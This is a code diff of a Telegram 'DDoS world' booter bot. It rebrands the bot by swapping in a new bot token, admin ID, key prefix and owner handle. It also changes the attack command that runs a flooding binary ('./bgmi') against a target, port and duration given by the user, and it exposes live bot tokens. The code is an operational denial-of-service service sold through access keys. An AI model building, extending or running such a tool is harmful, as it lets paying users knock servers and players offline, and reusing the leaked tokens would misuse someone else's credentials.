@@ -13,10 +13,10 @@ from dateutil.relativedelta import relativedelta
 import time
 
 # Idef create_random_key()nsert your Telegram bot token here
-bot = telebot.TeleBot('7731726163:AAHzeAjXx_FeQD8LAYuqfM62e3rJiFFlzkE')
+bot = telebot.TeleBot('7647515503:AAGS7t15F-BC-JewX6EcnpuBK2z-YOYGwP8')
 
 # Admin user IDs
-admin_id = {"5575401798"}
+admin_id = {"6437994839"}
 
 # Files for data storage
 USER_FILE = "users.json"
@@ -61,7 +61,7 @@ def save_keys():
         json.dump(keys, file)
 
 def create_random_key():
-    key = "VICKY-" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
+    key = "RITIK-" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
     keys[key] = {"status": "valid"}
     save_keys()
     return key
@@ -141,9 +141,9 @@ def start_command(message):
     if str(message.chat.id) in admin_id:
         markup.add(admin_panel_button)
     markup.add(attack_button, myinfo_button, redeem_button,  bot_sitting_button)
-    bot.reply_to(message, "𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 VICKY ☘ 𝐃𝐃𝐎𝐒 𝐖𝐎𝐑𝐋𝐃!", reply_markup=markup)
+    bot.reply_to(message, "𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 RITIK 𝐃𝐃𝐎𝐒 𝐖𝐎𝐑𝐋𝐃!", reply_markup=markup)
     
-admin_id = {"5575401798"}  # Existing admin IDs
+admin_id = {"6437994839"}  # Existing admin IDs
 users = {}
 coins = {}
 
@@ -354,7 +354,7 @@ def handle_attack(message):
         bot.register_next_step_handler(message, process_attack_details)
 
     else:
-        response = "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔️\n\n OWNER :- @Vickyoct2k08 !"
+        response = "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔️\n\n OWNER :- @RitikXyz099 !"
         bot.reply_to(message, response)
 
 def process_attack_details(message):
@@ -374,7 +374,7 @@ def process_attack_details(message):
             else:
                 # Log the attack with correct variable name
                 log_command(user_id, target, port, attack_time)
-                full_command = f"./RK {target} {port} {attack_time} 900"  # ✅ Correct variable name
+                full_command = f"./bgmi {target} {port} {attack_time} "  # ✅ Correct variable name
 
                 username = message.chat.username or "No username"
 
